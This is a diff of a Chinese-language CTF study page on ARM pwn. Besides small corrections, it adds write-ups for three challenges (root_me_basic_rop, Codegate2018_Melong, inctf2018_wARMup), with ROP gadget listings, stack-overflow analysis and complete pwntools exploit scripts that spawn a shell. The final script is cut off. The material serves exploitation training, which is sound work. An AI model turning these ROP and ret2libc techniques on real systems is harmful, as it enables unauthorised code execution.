@@ -72,7 +72,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#lubuntu1804" class="md-skip">
+        <a href="#elubuntu1804" class="md-skip">
           跳转至
         </a>
       
@@ -1135,7 +1135,7 @@
                   </a>
                 
                 
-                <h1 id="lubuntu1804">l环境搭建（基于Ubuntu18.04)<a class="headerlink" href="#lubuntu1804" title="Permanent link">&para;</a></h1>
+                <h1 id="elubuntu1804">El环境搭建（基于Ubuntu18.04)<a class="headerlink" href="#elubuntu1804" title="Permanent link">&para;</a></h1>
 <blockquote>
 <p>目前问题是ubuntu18下，在我的虚拟机中pwndbg和gdb-multiarch不能兼容，其他师傅却可以。尝试换成gef，结果gdb不行了反而gdb-multiarch可以。</p>
 <p>现阶段决定先在16编译qemu4.2先用着，到时再去嫖一个别人的镜像吧，因为我的这镜像也是多问题。。。</p>
@@ -1225,7 +1225,7 @@ Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2003
 <p>进入GDB后，首先使用命令<code>set architecture [Arch-name]</code>设置架构。(若安装了能自动识别架构的GDB插件这一步可以省略)</p>
 <p>然后使用<code>target remote localhost:[port]</code>来链接待调试的程序。(在GEF插件中，若想继续使用GEF插件的部分特性需要将命令改为<code>gef-remote localhost:[port]</code>)</p>
 <p>调试其他架构和运行库分别调整 qemu 和 -L 参数</p>
-<h2 id="_10">脚本调试<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h2>
+<h2 id="_10">脚本模板<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h2>
 <blockquote>
 <p>From:<a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/"><img alt="🔗" class="emojione" src="https://cdnjs.cloudflare.com/ajax/libs/emojione/2.2.7/assets/png/1f517.png" title=":link:" /></a></p>
 <p>使用 context.binary 指定 binary 时, 就可以不用指定 context.arch, context.os 等参数</p>
@@ -1298,7 +1298,7 @@ Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2003
 <td align="center">ESP</td>
 </tr>
 <tr>
-<td align="center">R14(LP)</td>
+<td align="center">R14(LR)</td>
 <td align="center">链接寄存器</td>
 <td align="center">无</td>
 </tr>
@@ -1425,7 +1425,13 @@ ldr r3, [r1], r2  @ 取址模式：基于索引后置修改。R3寄存器中的�
 str r2, [r1, r2, LSL#2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处，之后R1寄存器中的值被更新,也就R1 = R1 + R2&lt;&lt;2。
 ldr r3, [r1], r2, LSL#2  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1 = R1 + R2&lt;&lt;2。
 </code></pre></div>
-<h1 id="aarch64">AArch64架构<a class="headerlink" href="#aarch64" title="Permanent link">&para;</a></h1>
+<h2 id="armeabi">ARMEABI<a class="headerlink" href="#armeabi" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>未验证，感觉有点冲突</p>
+</blockquote>
+<p>前面介绍了arm 64位架构，armeabi 是 32 架构，指令也类似，只不过它的栈布局与常规 x86 的一样，<strong>R11和PC的值保存在栈底</strong>。<strong>R11充当ebp，PC充当RIP</strong> 。 LDMFD  SP!, {R11,PC} 指令即相当于 pop ebp;ret 的作用</p>
+<p>例题：<a href="# inctf2018_wARMup">inctf2018_wARMup</a></p>
+<h1 id="arch64">Arch64架构<a class="headerlink" href="#arch64" title="Permanent link">&para;</a></h1>
 <p>在ARMv8引入的一种全新架构。</p>
 <h2 id="_19">寄存器<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h2>
 <p>AArch拥有31个通用寄存器，系统运行在64位状态下的时候名字叫 Xn ，运行在32位的时候就叫 Wn 。</p>
@@ -1891,6 +1897,259 @@ B.NE            loc_4008AC
 
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
+<h2 id="root_me_basic_rop">root_me_basic_rop<a class="headerlink" href="#root_me_basic_rop" title="Permanent link">&para;</a></h2>
+<h3 id="_24">基本情况<a class="headerlink" href="#_24" title="Permanent link">&para;</a></h3>
+<p>32 位 arm 架构动态链接程序，打开 nx 保护。存在 scanf 函数栈溢出漏洞。通过调试测试得出溢出 0x44 后，就能控制 pc 寄存器。</p>
+<p><img alt="image-20210124201022270" src="../_images/arm/image-20210124201022270.png" /></p>
+<p>程序中有后门函数：</p>
+<p><img alt="image-20210124201322884" src="../_images/arm/image-20210124201322884.png" /></p>
+<p>ROPgadget 查询如下：</p>
+<div class="highlight"><pre><span></span><code>Gadgets information
+============================================================
+0x00010634 : pop {fp, pc}
+0x0001055c : pop {r0, r1, r4, r8, fp, ip, sp, pc}
+0x000103f8 : pop {r3, pc}
+0x000105b0 : pop {r4, fp, pc}
+
+Unique gadgets found: 4
+</code></pre></div>
+<p>结合 main 函数中 scanf 附件汇编指令，利用 pop_r3_pc 这个 gadget 可以控制 scanf 实现任意地址写。</p>
+<p><img alt="image-20210124203121632" src="../_images/arm/image-20210124203121632.png" /></p>
+<p>程序中现成有 system ，这里就向 bss 写入 <code>/bin/sh\x00</code> 作为参数调用。然后就是控制 r0 的值，先用 gadget 控制 r3 的值，接着将程序控制到 <code>0x1067c</code> 从而控制 r0 。</p>
+<p>程序劫持到 <code>0x1067c</code> 之后就会一直执行下去，遇到 <code>0x10684</code> 的话就会从 r11 上取值给 pc 而不是用 bss 段上的数据，所以这里还需要提前向 r11 写入一个存储着 exec 函数地址的地址，这个在写入 bss 时一起实现。两段 payload 分别是：</p>
+<div class="highlight"><pre><span></span><code><span class="n">payload1</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">padding</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x300</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_r3_pc</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x300</span><span class="o">-</span><span class="mh">0x4</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span>  <span class="c1"># R3:write address</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_scanf</span><span class="p">)</span>
+
+<span class="n">payload2</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;exec&#39;</span><span class="p">])</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_r3_pc</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x300</span><span class="o">-</span><span class="mh">0x4</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0001067C</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x300</span><span class="o">-</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0001067C</span><span class="p">)</span>
+</code></pre></div>
+<p>实际调试时发现 exec 前面几条函数会覆盖 <code>/bin/sh\x00</code> 前面的四个字节，不过问题不大，将其修改为 <code>xxxx;sh\x00</code> 即可。</p>
+<h3 id="exp_2">EXP<a class="headerlink" href="#exp_2" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./root_me_stack_spraying&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;debug&quot;</span>
+
+<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;r&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;remote_addr&quot;</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;l&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-arm&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/arm-linux-gnueabihf&quot;</span><span class="p">,</span> <span class="s2">&quot;./root_me_stack_spraying&quot;</span><span class="p">])</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-arm&quot;</span><span class="p">,</span> <span class="s2">&quot;-g&quot;</span><span class="p">,</span> <span class="s2">&quot;1234&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/arm-linux-gnueabihf&quot;</span><span class="p">,</span> <span class="s2">&quot;./root_me_stack_spraying&quot;</span><span class="p">])</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./root_me_stack_spraying&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/usr/arm-linux-gnueabihf/lib/libc.so.6&quot;</span><span class="p">)</span>
+
+<span class="n">pop_r3_pc</span> <span class="o">=</span> <span class="mh">0x000103f8</span>
+<span class="n">pop_r11_pc</span> <span class="o">=</span> <span class="mh">0x00010634</span>
+<span class="n">padding</span> <span class="o">=</span> <span class="mh">0x44</span>
+<span class="n">main_scanf</span> <span class="o">=</span> <span class="mh">0x0001065C</span>
+
+<span class="c1">#payload1 = &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&quot;</span>
+<span class="n">payload1</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">padding</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x300</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_r3_pc</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x300</span><span class="o">-</span><span class="mh">0x4</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span>  <span class="c1"># R3:write address</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_scanf</span><span class="p">)</span>         
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;bss:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;bss:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;exec&#39;</span><span class="p">]))</span>
+
+<span class="c1"># payload2 = &quot;/bin;sh\x00&quot; + p32(elf.sym[&#39;exec&#39;])</span>
+<span class="c1"># payload2 += p32(pop_r3_pc) + p32(elf.bss() + 0x300-0x4*3) + p32(pop_r11_pc)</span>
+<span class="c1"># payload2 += p32(elf.bss() + 0x300-0x4) + p32(0x0001067C)</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="s2">&quot;skye;sh</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;exec&#39;</span><span class="p">])</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_r3_pc</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x300</span><span class="o">-</span><span class="mh">0x4</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_r11_pc</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="mh">0x300</span><span class="o">-</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0001067C</span><span class="p">)</span>
+
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="codegate2018_melong">Codegate2018_Melong<a class="headerlink" href="#codegate2018_melong" title="Permanent link">&para;</a></h2>
+<ol>
+<li>分析压栈变量个数</li>
+<li>分析rop返回位置</li>
+<li>libc静态加载特性</li>
+</ol>
+<h3 id="_25">基本情况<a class="headerlink" href="#_25" title="Permanent link">&para;</a></h3>
+<p>32位ARM动态链接程序，仅开启NX保护。</p>
+<p>程序是一个 BMI 计算器，在 write_diary(len, addr); 存在栈溢出，长度实际上是经过 PT 函数计算 check 函数输入的身高体重数据后，得出的 BMI 指数，addr 对应是 main 函数中的局部变量。</p>
+<p>PT 函数挺奇特的，如果需要控制返回值为输入的 size 就需要满足 if 条件。exc2 一直都没有赋值为 0 ，所以需要利用 malloc 申请失败返回 null 。因此这里输入 -1 ，将返回值设置为 -1 。</p>
+<p><img alt="image-20210123003225618" src="../_images/arm/image-20210123003225618.png" /></p>
+<p>在 PT 中 size 数据类型为 size_t ，在 write_diary 用 unsigned int 存储原本 -1 变成非常大的数，造成栈溢出。</p>
+<p><img alt="image-20210123003805545" src="../_images/arm/image-20210123003805545.png" /></p>
+<h3 id="_26">思路<a class="headerlink" href="#_26" title="Permanent link">&para;</a></h3>
+<p>和 x86 架构下 ret2libc 的思路一样，只是不同架构 payload 需要调整。</p>
+<p>padding 长度和 x86 一样，可以在 ida 中看出来是 50+4 ：</p>
+<p><img alt="image-20210123004311891" src="../_images/arm/image-20210123004311891.png" /></p>
+<p><strong>注意在 arm 程序没有 ebp 这个位置的填充</strong>，具体可以从汇编分析得出：</p>
+<div class="highlight"><pre><span></span><code>PUSH    {R11,LR};将R11+LR指向的内容压栈
+ADD     R11, SP, #4;
+SUB     SP, SP, #0x50;栈顶向低地址移动0x50
+LDR     R3, =stdin__GLIBC_2.4;函数体开始
+……
+</code></pre></div>
+<p>只有 R11 一个寄存器压栈了，所以 padding 应该为：50+4</p>
+<p>ROPgadget 能找到合适的 gadget ：<code>0x00011bbc : pop {r0, pc}</code> ，泄露 libc ：</p>
+<div class="highlight"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">gadget</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">got</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">plt</span><span class="p">)</span>
+</code></pre></div>
+<p>返回 main 函数无论怎么搞都返回不了。但是**发现 libc 是静态加载的，两次泄露地址都是一样的**，所以直接调用 system :</p>
+<div class="highlight"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">gadget</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+</code></pre></div>
+<h3 id="exp_3">EXP<a class="headerlink" href="#exp_3" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./melong&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;debug&quot;</span>
+
+<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;r&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;remote_addr&quot;</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;l&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-arm&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/arm-linux-gnueabi&quot;</span><span class="p">,</span> <span class="s2">&quot;./melong&quot;</span><span class="p">])</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&quot;qemu-arm&quot;</span><span class="p">,</span> <span class="s2">&quot;-g&quot;</span><span class="p">,</span> <span class="s2">&quot;1234&quot;</span><span class="p">,</span> <span class="s2">&quot;-L&quot;</span><span class="p">,</span> <span class="s2">&quot;/usr/arm-linux-gnueabi&quot;</span><span class="p">,</span> <span class="s2">&quot;./melong&quot;</span><span class="p">])</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./melong&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span><span class="p">)</span>
+
+<span class="c1">#libc_base = 0xff6b6f98 - libc.symbols[&#39;puts&#39;]</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0xff6bb770</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">bin_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
+
+<span class="c1">#payload  = &#39;A&#39; * 0x54 + p32(0x00011bbc) + p32(elf.got[&#39;puts&#39;]) + p32(elf.plt[&#39;puts&#39;])#+p32(elf.sym[&#39;main&#39;])*2</span>
+<span class="n">payload</span>  <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x54</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x00011bbc</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Type the number:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your height(meters) : &#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your weight(kilograms) : &#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Type the number:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;How long do you want to take personal training?&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;-1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Type the number:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Type the number:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;6&#39;</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="inctf2018_warmup">inctf2018_wARMup<a class="headerlink" href="#inctf2018_warmup" title="Permanent link">&para;</a></h2>
+<h3 id="_27">基本情况<a class="headerlink" href="#_27" title="Permanent link">&para;</a></h3>
+<p>32 位动态链接 arm 程序只打开了 nx 保护，存在 0x10 字节溢出。</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">104</span><span class="p">];</span> <span class="c1">// [sp+4h] [bp-68h] BYREF</span>
+
+  <span class="n">setvbuf</span><span class="p">((</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">_bss_start</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Welcome to bi0s CTF!&quot;</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">120u</span><span class="p">);</span>         <span class="c1">// 溢出0x10</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>长度是足够完成 ret2libc 操作，但是没有控制 r0 的 gadget ：</p>
+<p><img alt="image-20210123162353020" src="../_images/arm/image-20210123162353020.png" /></p>
+<p>这里思路是利用现有 gadget 控制 r3 为 bss 段上地址,利用 main 函数本身汇编代码调用 read 将 shellcode 写入到 bss 上。</p>
+<p><img alt="image-20210123162740601" src="../_images/arm/image-20210123162740601.png" /></p>
+<p>构造写入 payload 问题不大：</p>
+<div class="highlight"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">104</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">pop_r3_pc</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">main_read</span><span class="p">)</span>
+</code></pre></div>
+<p>问题是在再次控制程序流到 bss 上，执行 shellocde 。这里通过调试发现 armeabi（32位arm）出栈时使用的汇编 <code>pop    {fp, pc}</code> （fp和r11是同一个寄存器）给 pc 赋值。这句汇编是**将 fp 指向地址的值赋给 pc** ，而这个 fp 类似于 ebp ，pc 等于 eip 。</p>
+<p><img alt="image-20210123171408650" src="../_images/arm/image-20210123171408650.png" /><img alt="image-20210123171453220" src="../_images/arm/image-20210123171453220.png" /></p>
+<blockquote>
+<p>这里截图使用下面的 payload ，也就是 r11 的值是 bss+0x100</p>
+</blockquote>
+<p>如果我们用上面这个 payload 去打，当利用 main 函数内汇编调用完 read 后会继续运行到 main 结尾，也就是会再次调用 mian 结尾的出栈流程。由于之前 fp 被赋值为 <code>aaaa</code> ，所以程序会 <code>pop [fp,pc}</code> 处报错，因为 0x61616161 不存在。</p>
+<p><img alt="image-20210123171145355" src="../_images/arm/image-20210123171145355.png" /></p>
+<p>我们就利用这一点将 fp 覆盖为 bss 段，实现调用：</p>
+<div class="highlight"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">100</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">pop_r4_pc</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">main_read</span><span class="p">)</span>
+</code></pre></div>
+<h3 id="exp_4">EXP<a class="headerlink" href="#exp_4" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>迁移完，要Shellcode 前面加个地址跳转</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./wARMup&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;debug&quot;</span>
+
+<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;r&quot;</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;remote_addr&quot;</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;l&quot;</span><span class="p">:</span>
